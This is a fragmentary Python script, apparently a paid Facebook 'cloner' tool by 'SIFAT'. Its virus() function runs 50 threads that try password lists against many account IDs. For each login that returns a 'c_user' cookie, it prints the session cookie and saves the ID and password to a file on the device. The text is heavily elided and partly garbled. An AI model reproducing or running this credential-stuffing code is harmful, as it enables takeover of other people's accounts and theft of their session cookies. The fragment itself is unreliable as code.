...
try:
    ...
    exit()
def banner():
    print("[=] ðŸ˜Œ Testing New mathod By SIFAT")
...
def menu_apikey():
  ...
  id = "༒".join(uuid)
  server = requests.get('https://github.com/SIFAT-XD/APPROVAL-KEY/blob/main/SIFAT%20PAID').text
...
\033[1;97m═════════════════════════════════════════════ """)
  ...
  print("")
  try:
    httpCaht = requests.get("https://github.com/SIFAT-XD/APPROVAL-KEY/blob/main/SIFAT%20PAID").text
    if id in httpCaht:
...
def Main():
	...
	print("[3] BD Number cloner [APK] BEST")
...
def admin():
	...
	if bal =='1':
		os.system('xdg-open https://wa.me/+8801858094178');time.sleep(1)
		admin()
	if bal =='2':
		os.system('xdg-open https://www.facebook.com/shifat.ff.buy.sell');time.sleep(1)
		admin()
	if bal =='3':
	...
	if bal =='4':
		...
		admin()
	if bal =='5':
		os.system('xdg-open https://github.com/SIFAT-XD');time.sleep(1)
		admin()
	if bal =='0':
		Main()
...
def virus():
	...
	with ThreadPool(max_workers=50) as yaari:
		...
		print(logo)
		tl = str(len(user))
		print(' \033[1;97m[\033[1;92m✿\033[1;97m]  Total Account: '+tl)
		print(f"\033[1;97m [\033[1;92m✿\033[1;97m]  Varion:\033[1;97m {doamin}")
		print(' \033[1;97m[\033[1;92m✿\033[1;97m]  The Process Has Been Started')
		print(' \033[1;97m[\033[1;92m✿\033[1;97m]  Use Aeroplane Mode For Speed Up')
		print('\x1b[91m══════════════════════════════════════════════')
		for guru in user:
        ...
        for ps in pwx:
           ...
           'method': 'GET', 
            ...
            if 'c_user' in log_cookies:
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\r\x1b[38;5;196m[SIFAT-CP] {uid} | {ps}")
                #print(f'{W}CP-UA--> {pro}\n ')
                ...
                continue
        loop+=1
        sys.stdout.write(f'\r\033[m[SIFAT] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
        ...
        for ps in pwx:
           ...
           'method': 'GET', 
            ...
            if 'c_user' in log_cookies:
                ...
                print(f'\r\033[1;92m [💯] COOKIE : '+coki)
                oks.append(cid)
                open('/sdcard/SIFAT-OK.txt', 'a').write(cid+' | '+ps+' | '+uid+'\n')
                break
            else:
                continue
        loop+=1        
